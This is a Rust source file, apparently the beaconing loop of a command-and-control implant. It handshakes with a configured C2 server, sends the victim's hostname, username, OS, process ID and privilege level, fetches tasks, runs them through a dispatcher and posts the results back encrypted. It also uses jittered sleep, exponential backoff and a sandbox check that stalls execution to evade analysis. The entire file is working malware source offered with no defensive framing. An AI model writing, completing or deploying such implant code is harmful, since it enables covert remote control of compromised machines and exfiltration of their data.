// Boucle C2 : handshake RSA-OAEP, check-in AES-GCM, dispatch, backoff.
use std::thread;
use std::time::Duration;

use anyhow::Result;
use base64::Engine;
use serde_json::{json, Value};

use crate::{config, crypto, framing, hostinfo, modules};
use crate::transport::Transport;

pub struct Beacon {
    transport: Transport,
    id: [u8; 16],
    session: Option<crypto::SessionKey>,
    interval: u64,
    jitter: f64,
}

impl Beacon {
    pub fn new() -> Result<Self> {
        let host_str = config::C2_URL
            .trim_start_matches("https://")
            .trim_start_matches("http://");
        let (host, port) = if let Some((h, p)) = host_str.split_once(':') {
            (h.to_string(), p.parse::<u16>().unwrap_or(8443))
        } else {
            (host_str.to_string(), 8443)
        };

        let hostname = hostinfo::hostname();
        let username = hostinfo::username();
        let id = crypto::implant_id(&hostname, &username);

        Ok(Self {
            transport: Transport::new(&host, port)?,
            id,
            session: None,
            interval: config::INTERVAL,
            jitter: config::JITTER,
        })
    }

    pub fn run(&mut self) {
        if !modules::detect::looks_safe() {
            thread::sleep(Duration::from_secs(config::BACKOFF_MAX));
        }
        let mut backoff = config::BACKOFF_START;
        loop {
            match self.tick() {
                Ok(()) => {
                    backoff = config::BACKOFF_START;
                    self.sleep_jitter();
                }
                Err(_) => {
                    self.session = None;
                    thread::sleep(Duration::from_secs(backoff));
                    backoff = (backoff * 2).min(config::BACKOFF_MAX);
                }
            }
        }
    }

    fn tick(&mut self) -> Result<()> {
        if self.session.is_none() {
            self.handshake()?;
        }
        self.check_in()
    }

    fn handshake(&mut self) -> Result<()> {
        let public_pem = self.transport.get("/api/v1/pubkey")?;
        let public_pem_str = std::str::from_utf8(&public_pem)?;

        let session = crypto::SessionKey::generate();
        let wrapped = crypto::wrap_session_key(public_pem_str, &session)?;

        let body = json!({
            "id":       hex::encode(self.id),
            "key":      base64::engine::general_purpose::STANDARD.encode(&wrapped),
            "hostname": hostinfo::hostname(),
            "username": hostinfo::username(),
            "os":       hostinfo::os_version(),
            "pid":      hostinfo::pid(),
            "elevated": hostinfo::elevated(),
            "arch":     hostinfo::arch(),
        });

        let reply = self.transport.post_json(
            "/api/v1/session",
            serde_json::to_vec(&body)?.as_slice(),
        )?;

        let config_bytes = framing::unpack(&reply, &session)?;
        let cfg: Value = serde_json::from_slice(&config_bytes).unwrap_or_default();
        if let Some(v) = cfg.get("interval").and_then(Value::as_u64) {
            self.interval = v;
        }
        if let Some(v) = cfg.get("jitter").and_then(Value::as_f64) {
            self.jitter = v;
        }
        self.session = Some(session);
        Ok(())
    }

    fn check_in(&mut self) -> Result<()> {
        let session = self.session.as_ref().unwrap();
        let frame = framing::pack(&self.id, session, br#"{"t":"alive"}"#);
        let reply = self.transport.post("/api/v1/check", &frame)?;
        let msg_bytes = framing::unpack(&reply, session)?;

        let msg: Value = serde_json::from_slice(&msg_bytes)?;
        if msg.get("t").and_then(Value::as_str) != Some("task") {
            return Ok(());
        }

        let command = msg.get("command").and_then(Value::as_str).unwrap_or("");
        let args = msg.get("args").and_then(Value::as_str).unwrap_or("");
        let task_id = msg.get("id").and_then(Value::as_i64).unwrap_or(0);

        let output = modules::dispatch(command, args);

        let result = json!({
            "t":       "result",
            "task_id": task_id,
            "body":    output,
        });
        let result_frame =
            framing::pack(&self.id, session, serde_json::to_vec(&result)?.as_slice());
        self.transport.post("/api/v1/result", &result_frame)?;
        Ok(())
    }

    fn sleep_jitter(&self) {
        use rand::Rng;
        let spread = self.interval as f64 * self.jitter;
        let secs = self.interval as f64 + rand::thread_rng().gen_range(-spread..=spread);
        thread::sleep(Duration::from_secs_f64(secs.max(1.0)));
    }
}
